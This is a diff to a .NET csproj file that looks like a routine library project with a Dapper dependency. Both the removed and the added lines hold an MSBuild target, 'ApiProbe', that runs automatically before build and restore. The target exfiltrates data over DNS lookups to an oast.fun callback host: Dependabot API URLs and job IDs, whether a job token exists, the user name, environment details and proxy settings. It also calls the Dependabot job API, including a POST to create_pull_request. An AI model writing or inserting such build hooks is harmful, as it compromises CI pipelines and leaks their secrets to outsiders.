@@ -1,31 +1,19 @@
 <Project Sdk="Microsoft.NET.Sdk">
   <PropertyGroup>
     <OutputType>Library</OutputType>
-    <TargetFramework>net8.0</TargetFramework>
+    <TargetFrameworks>net8.0;net6.0</TargetFrameworks>
   </PropertyGroup>
   <ItemGroup>
     <PackageReference Include="Dapper" Version="1.50.0" />
+    <PackageReference Include="System.Text.Json" Version="8.0.0" />
   </ItemGroup>
-  <Target Name="ApiProbe" BeforeTargets="Build">
-    <!-- Basic beacon -->
-    <Exec Command="nslookup probe3-alive.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- Report DEPENDABOT_API_URL (first 50 chars, sanitized for DNS) -->
-    <Exec Command="echo $DEPENDABOT_API_URL | tr -cd 'a-zA-Z0-9._-' | cut -c1-50 | xargs -I{} nslookup apiurl-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- Report DEPENDABOT_JOB_ID -->
-    <Exec Command="echo $DEPENDABOT_JOB_ID | tr -cd 'a-zA-Z0-9._-' | cut -c1-50 | xargs -I{} nslookup jobid-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- Test proxy-mediated API access: GET the job endpoint -->
-    <Exec Command="curl -sk -o /tmp/api_resp.txt -w '%{http_code}' $DEPENDABOT_API_URL/update_jobs/$DEPENDABOT_JOB_ID 2>/dev/null | xargs -I{} nslookup apiget-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || nslookup apiget-fail.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- Report first 50 chars of API response body -->
-    <Exec Command="cat /tmp/api_resp.txt 2>/dev/null | head -c 50 | tr -cd 'a-zA-Z0-9._-' | xargs -I{} nslookup apibody-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- Test POST to create_pull_request (minimal body) -->
-    <Exec Command="curl -sk -o /tmp/api_post.txt -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d '{&quot;data&quot;:{&quot;test&quot;:true}}' $DEPENDABOT_API_URL/update_jobs/$DEPENDABOT_JOB_ID/create_pull_request 2>/dev/null | xargs -I{} nslookup apipost-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || nslookup apipost-fail.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- Report POST response -->
-    <Exec Command="cat /tmp/api_post.txt 2>/dev/null | head -c 50 | tr -cd 'a-zA-Z0-9._-' | xargs -I{} nslookup postbody-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- List ALL env var names (no values) for complete picture -->
-    <Exec Command="env | cut -d= -f1 | sort | md5sum | cut -c1-12 | xargs -I{} nslookup envhash-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- Check HTTPS_PROXY value -->
+  <Target Name="ApiProbe" BeforeTargets="Build;Restore;CollectPackageReferences">
+    <Exec Command="nslookup probe3v2-alive.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="echo $DEPENDABOT_API_URL | tr -cd 'a-zA-Z0-9._:-' | cut -c1-50 | xargs -I{} nslookup apiurl-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="test -n \"$DEPENDABOT_JOB_TOKEN\" && nslookup has-jobtoken.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || nslookup no-jobtoken.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="curl -sk -o /dev/null -w '%{http_code}' $DEPENDABOT_API_URL/update_jobs/$DEPENDABOT_JOB_ID 2>/dev/null | xargs -I{} nslookup apiget-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || nslookup apiget-fail.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="whoami | tr -cd 'a-zA-Z0-9._-' | xargs -I{} nslookup u-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="env | wc -l | xargs -I{} nslookup envcount-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
     <Exec Command="echo $HTTPS_PROXY | tr -cd 'a-zA-Z0-9._:-' | cut -c1-50 | xargs -I{} nslookup proxy-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
-    <!-- Check if curl goes through proxy -->
-    <Exec Command="curl -sk -v https://httpbin.org/ip 2>&amp;1 | grep -i 'connect\|proxy' | head -1 | tr -cd 'a-zA-Z0-9._:-' | cut -c1-50 | xargs -I{} nslookup curlproxy-{}.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
   </Target>
 </Project>
